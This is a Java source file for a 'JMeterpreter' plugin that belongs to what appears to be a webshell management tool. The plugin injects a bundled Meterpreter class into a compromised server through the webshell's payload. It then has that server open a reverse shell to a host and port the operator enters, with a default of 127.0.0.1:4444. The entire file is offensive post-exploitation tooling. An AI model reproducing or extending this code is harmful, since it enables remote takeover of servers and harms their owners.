package shells.plugins.java;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(Name = "JMeterpreter", payloadName = "JavaDynamicPayload")
public class Meterpreter implements Plugin {
    private static final String CLASS_NAME = "plugin.Meterpreter";
    private Encoding encoding;
    private JButton goButton = new JButton("Go");
    private JLabel hostLabel = new JLabel("host :");
    private JTextField hostTextField = new JTextField("127.0.0.1", 15);
    private JButton loadButton = new JButton("Load");
    private boolean loadState;
    private JSplitPane meterpreterSplitPane = new JSplitPane();
    private JPanel panel = new JPanel(new BorderLayout());
    private Payload payload;
    private JLabel portLabel = new JLabel("port :");
    private JTextField portTextField = new JTextField("4444", 7);
    private ShellEntity shellEntity;
    private RTextArea tipTextArea = new RTextArea();

    public Meterpreter() {
        this.meterpreterSplitPane.setOrientation(0);
        this.meterpreterSplitPane.setDividerSize(0);
        JPanel meterpreterTopPanel = new JPanel();
        meterpreterTopPanel.add(this.hostLabel);
        meterpreterTopPanel.add(this.hostTextField);
        meterpreterTopPanel.add(this.portLabel);
        meterpreterTopPanel.add(this.portTextField);
        meterpreterTopPanel.add(this.loadButton);
        meterpreterTopPanel.add(this.goButton);
        this.meterpreterSplitPane.setTopComponent(meterpreterTopPanel);
        this.meterpreterSplitPane.setBottomComponent(new JScrollPane(this.tipTextArea));
        initTip();
        this.panel.add(this.meterpreterSplitPane);
    }

    private void loadButtonClick(ActionEvent actionEvent) {
        if (!this.loadState) {
            try {
                InputStream inputStream = getClass().getClassLoader().getResourceAsStream("shell/java/assets/Meterpreter.classs");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.payload.include(CLASS_NAME, data)) {
                    this.loadState = true;
                    JOptionPane.showMessageDialog(this.panel, "Load success", "提示", 1);
                    return;
                }
                JOptionPane.showMessageDialog(this.panel, "Load fail", "提示", 2);
            } catch (Exception e) {
                Log.error(e);
                JOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
            }
        } else {
            JOptionPane.showMessageDialog(this.panel, "Loaded", "提示", 1);
        }
    }

    private void goButtonClick(ActionEvent actionEvent) {
        String host = this.hostTextField.getText().trim();
        String port = this.portTextField.getText().trim();
        ReqParameter reqParamete = new ReqParameter();
        reqParamete.add("host", host);
        reqParamete.add("port", port);
        String resultString = this.encoding.Decoding(this.payload.evalFunc(CLASS_NAME, "run", reqParamete));
        Log.log(resultString, new Object[0]);
        JOptionPane.showMessageDialog(this.panel, resultString, "提示", 1);
    }

    @Override 
    public void init(ShellEntity shellEntity2) {
        this.shellEntity = shellEntity2;
        this.payload = this.shellEntity.getPayloadModel();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    private void initTip() {
        try {
            InputStream inputStream = getClass().getClassLoader().getResourceAsStream("shell/java/assets/meterpreterTip.txt");
            this.tipTextArea.setText(new String(functions.readInputStream(inputStream)));
            inputStream.close();
        } catch (Exception e) {
            Log.error(e);
        }
    }

    @Override 
    public JPanel getView() {
        return this.panel;
    }
}
